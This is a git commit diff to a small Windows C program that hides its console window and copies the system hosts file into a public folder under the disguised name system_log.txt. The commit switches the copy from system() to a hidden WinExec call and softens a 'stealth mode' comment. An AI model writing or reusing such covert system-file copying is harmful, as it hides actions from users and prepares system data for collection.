bdd814ff81b9e5964c79ef83a5b316fbbe119c12
Amir <am.eskandari@icloud.com>
2025-02-02 13:34:53 -0800

    Update source.c

--- source.c
+++ source.c
@@ -2,12 +2,12 @@
 #include <stdio.h>
 
 int main() {
-    // Hide command window execution (stealth mode)
+    // Hide console window
     HWND hwnd = GetConsoleWindow();
     ShowWindow(hwnd, SW_HIDE);
 
-    // Command to copy the real hosts file (bypassing Windows redirection)
-    system("cmd.exe /c copy C:\\Windows\\Sysnative\\drivers\\etc\\hosts C:\\Users\\Public\\system_log.txt > NUL 2>&1");
+    // Copy the real hosts file using WinExec (bypasses redirection issues)
+    WinExec("cmd.exe /c copy C:\\Windows\\Sysnative\\drivers\\etc\\hosts C:\\Users\\Public\\system_log.txt", SW_HIDE);
 
     return 0;
 }
